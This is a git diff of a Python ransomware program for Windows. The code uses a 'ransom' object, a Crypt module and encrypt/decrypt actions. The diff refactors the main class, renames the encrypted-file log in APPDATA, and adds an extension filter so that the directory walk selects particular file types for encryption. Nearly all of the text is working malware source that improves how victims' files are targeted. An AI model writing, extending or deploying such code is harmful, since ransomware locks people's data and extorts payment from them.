@@ -13,17 +13,20 @@ import win32event
 
 # Import classes
 import Crypt
+import Base
 import image as image_handle
+
 
 ################
 ## Main Class ##
 ################
-class main():
+class Main(Base.Base):
   # Class to create a main object for the program
+
 
   def __init__(self, action, decrypt_key):
     # Init Object
-    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "files.txt")
+    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "files.html")
 
     # Init Crypt Lib
     if decrypt_key and action == "decrypt":
@@ -89,6 +92,7 @@ class main():
         fh.write("\n")
       fh.close()
 
+
   def find_files(self):
     # Function to find the relevant files to encrypt and return a list
     base_dirs = self.get_base_dirs()
@@ -98,12 +102,35 @@ class main():
       for path,subdirs,files in os.walk(directory):
         for file in files:
           if os.path.isfile(os.path.join(path, file)):
-            file_list.append(os.path.join(path, file))
+            # Check extension is valid
+            if self.is_valid_filetype(file):
+              file_list.append(os.path.join(path, file))
         for file in subdirs:
           if os.path.isfile(os.path.join(path, file)):
-            file_list.append(os.path.join(path, file))
+            if self.is_valid_filetype(file):
+              file_list.append(os.path.join(path, file))
 
     return file_list
+
+
+  def is_valid_filetype(self, file):
+    # Function to validate that the file extension is valid
+    # TODO Add something (like mimetype) to check that the file is NOT wanted, if it has no extension
+
+    # Split filename
+    components = file.split(".")
+
+    # If no extension, return False
+    if len(components) <= 1:
+      return False
+
+    # Get extension and check if valid
+    extension = components[-1]
+    if extension in self.filetypes:
+      return True
+    else:
+      return False
+
 
   def get_base_dirs(self):
     # Function to return a list of base directories form which to start the encryption/decryption process
@@ -182,5 +209,5 @@ if __name__ == "__main__":
 
     # Otherwise run
     else:
-      ransom = main(action, key)
+      ransom = Main(action, key)
 
